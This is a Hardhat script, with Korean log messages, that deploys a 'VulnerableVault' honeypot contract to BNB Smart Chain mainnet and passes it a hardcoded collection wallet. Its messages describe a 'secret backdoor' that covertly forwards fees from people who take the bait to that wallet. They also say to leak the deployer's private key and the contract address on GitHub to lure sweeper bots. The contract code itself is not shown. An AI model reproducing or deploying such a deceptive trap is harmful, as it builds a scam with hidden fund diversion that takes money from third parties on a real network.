const hre = require("hardhat");

async function main() {
    console.log("\n==================================================================");
    console.log("☠️  [리버스 허니팟 작전 개시] 해커들을 낚을 위장 금고 배포 준비 중...");
    console.log("==================================================================\n");

    const [deployer] = await hre.ethers.getSigners();
    const balance = await hre.ethers.provider.getBalance(deployer.address);

    console.log(`[배포자 지갑 (미끼 계정)]: ${deployer.address}`);
    console.log(`[현재 가스비 잔액]: ${hre.ethers.formatEther(balance)} BNB\n`);

    if (balance === 0n) {
        console.error("❌ 에러: 배포 지갑에 가스비(BNB)가 없습니다. 메인넷 배포가 불가능합니다.");
        process.exit(1);
    }

    // 사령관님의 수금용 지갑 (덫에 걸린 해커의 돈이 자동으로 송금될 곳)
    const trueCommanderWallet = "0x75e588eEe61967b7802b4396e2fCc193D8C710Cd";
    
    console.log("🔥 [비밀 백도어 설정 완료] 해커가 보내는 수수료는 즉시 다음 지갑으로 은밀히 자동 이체됩니다.");
    console.log(`➡️  [수금용 목적지]: ${trueCommanderWallet}\n`);

    console.log("⏳ 바이낸스 스마트 체인(BSC) 메인넷에 덫을 설치하고 있습니다...");
    
    const VaultFactory = await hre.ethers.getContractFactory("VulnerableVault");
    const vault = await VaultFactory.deploy(trueCommanderWallet);
    await vault.waitForDeployment();

    const vaultAddress = await vault.getAddress();

    console.log("\n==================================================================");
    console.log("🎯 [배포 대성공] 역공 덫(VulnerableVault) 설치 완료!");
    console.log("==================================================================");
    console.log(`📌 위장 금고 컨트랙트 주소: ${vaultAddress}`);
    console.log("==================================================================\n");
    
    console.log("💡 [다음 작전 지시]:");
    console.log("이제 이 주소와 배포자 지갑의 개인 키를 깃허브에 노출시키면, 스위퍼 봇들이 달려들어 스스로 수수료를 헌납할 것입니다! 💸");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
